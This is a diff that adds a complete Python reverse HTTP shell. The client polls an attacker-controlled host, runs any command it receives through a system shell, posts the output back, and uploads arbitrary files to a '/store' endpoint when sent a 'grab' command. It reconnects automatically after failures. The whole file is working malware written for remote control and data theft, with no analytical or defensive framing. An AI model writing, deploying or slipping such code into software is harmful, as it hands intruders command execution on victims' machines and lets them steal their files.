@@ -1,0 +1,96 @@
+#// - Connects to attacker server at http://<attacker_ip>:<attacker_port> for commands.
+#// - Sends commands to '/' endpoint; uploads files with 'grab <file>' to '/store' endpoint.
+#// - Reconnects automatically on connection failure; terminates on 'terminate' command.
+
+import urllib
+import subprocess
+import time
+import os
+
+ATTACKER_HOST = "${ATTACKER_HOST}"
+ATTACKER_PORT = "${ATTACKER_PORT}"
+
+class ReverseHTTPShell:
+    def __init__(self, attacker_ip, attacker_port):
+        self.attacker_ip = attacker_ip
+        self.attacker_port = attacker_port
+        self.current_dir = os.getcwd()
+
+    def send_post(self, data, url=None):
+        if url is None:
+            url = f'http://{self.attacker_ip}:{self.attacker_port}'
+        if isinstance(data, bytes):
+            data = data.decode(errors='ignore')
+        data = {"rfile": data}
+        data = urllib.parse.urlencode(data).encode()
+        try:
+            req = urllib.request.Request(url, data=data)
+            urllib.request.urlopen(req, timeout=5)
+        except Exception:
+            pass
+
+    def send_file(self, command):
+        try:
+            _, path = command.strip().split(' ', 1)
+        except ValueError:
+            self.send_post("[-] Invalid grab command (maybe multiple spaces)")
+            return
+
+        if not os.path.exists(path):
+            self.send_post("[-] Not able to find the file")
+            return
+
+        store_url = f'http://{self.attacker_ip}:{self.attacker_port}/store'
+        try:
+            with open(path, 'rb') as fp:
+                self.send_post(fp.read(), url=store_url)
+        except Exception as e:
+            self.send_post(f"[-] Failed to read/send file: {str(e)}")
+
+    def run_command(self, command):
+        if command.strip().startswith('cd '):
+            path = command.strip()[3:].strip()
+            try:
+                os.chdir(path)
+                self.current_dir = os.getcwd()
+                self.send_post(f"[+] Changed directory to {self.current_dir}")
+            except Exception as e:
+                self.send_post(f"[-] Failed to change directory: {str(e)}")
+            return
+
+        try:
+            CMD = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                   shell=True, cwd=self.current_dir)
+            out, err = CMD.communicate(timeout=15)
+            if out:
+                self.send_post(out)
+            if err:
+                self.send_post(err)
+        except subprocess.TimeoutExpired:
+            self.send_post("[-] Command timed out.")
+        except Exception as e:
+            self.send_post(f"[-] Failed to run command: {str(e)}")
+
+    def connect_loop(self):
+        while True:
+            try:
+                url = f"http://{self.attacker_ip}:{self.attacker_port}"
+                command = urllib.request.urlopen(url, timeout=10).read().decode()
+            except Exception:
+                time.sleep(5)
+                continue
+
+            if 'terminate' in command:
+                break
+
+            if command.startswith('grab '):
+                self.send_file(command)
+            else:
+                self.run_command(command)
+
+            time.sleep(1)
+
+
+if __name__ == '__main__':
+    shell = ReverseHTTPShell(ATTACKER_HOST, int(ATTACKER_PORT))
+    shell.connect_loop()
